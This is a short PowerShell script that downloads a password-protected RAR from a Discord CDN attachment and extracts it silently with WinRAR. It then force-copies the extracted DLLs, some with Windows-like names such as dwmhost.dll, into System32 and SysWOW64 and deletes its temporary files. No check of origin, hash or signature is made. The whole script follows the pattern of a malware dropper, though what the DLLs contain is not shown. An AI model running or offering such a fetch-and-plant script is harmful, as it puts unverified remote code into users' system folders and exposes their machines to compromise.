# Check if WinRAR is installed
$winrar = "${env:ProgramFiles}\WinRAR\WinRAR.exe"
if (!(Test-Path $winrar)) { $winrar = "${env:ProgramFiles(x86)}\WinRAR\WinRAR.exe" }
if (!(Test-Path $winrar)) {
    Write-Host "WinRAR not found. Install WinRAR and re-run." -ForegroundColor Red
    exit
}

# Define temp paths
$tempFolder   = "$env:TEMP\core_unpack"
$tempRar      = "$tempFolder\root.rar"
$extractPath  = "$tempFolder\extracted"

# Clean up old temp data
if (Test-Path $tempFolder) { Remove-Item $tempFolder -Recurse -Force }
New-Item -ItemType Directory -Path $extractPath -Force | Out-Null

# Your file URL (replace this)
$url = "https://cdn.discordapp.com/attachments/1378738023247642697/1384859490679001129/root.rar?ex=6853f668&is=6852a4e8&hm=3cf2eaa871ec1db7ba74e4a7b764ebee2dffc9e9a31a8bbc8fa09013f5240715&"

# Download the .rar
Write-Host "[*] Downloading..."
Invoke-WebRequest -Uri $url -OutFile $tempRar -UseBasicParsing

# Extract using WinRAR and password
Write-Host "[*] Extracting archive with password..."
Start-Process -FilePath $winrar -ArgumentList "x -p69 -inul `"$tempRar`" `"$extractPath`"" -Wait

# Define targets
$sys32 = "$env:windir\System32"
$wow64 = "$env:windir\SysWOW64"

# Define which DLLs go where
$sys32Dlls = @("apon.dll", "dwmhost.dll")
$wow64Dlls = @("Aotbst.dll", "cimgui.dll", "dwmhost.dll")

Write-Host "[*] Copying DLLs..."

# Loop through all extracted DLLs
Get-ChildItem -Path $extractPath -Filter *.dll | ForEach-Object {
    $file = $_.Name
    $path = $_.FullName

    if ($sys32Dlls -contains $file) {
        Copy-Item $path -Destination $sys32 -Force
    }

    if ($wow64Dlls -contains $file) {
        Copy-Item $path -Destination $wow64 -Force
    }
}

# Cleanup temp files
Write-Host "[*] Cleaning up..."
Remove-Item $tempFolder -Recurse -Force -ErrorAction SilentlyContinue

Write-Host "`n[OK] DLLs installed successfully." -ForegroundColor Green
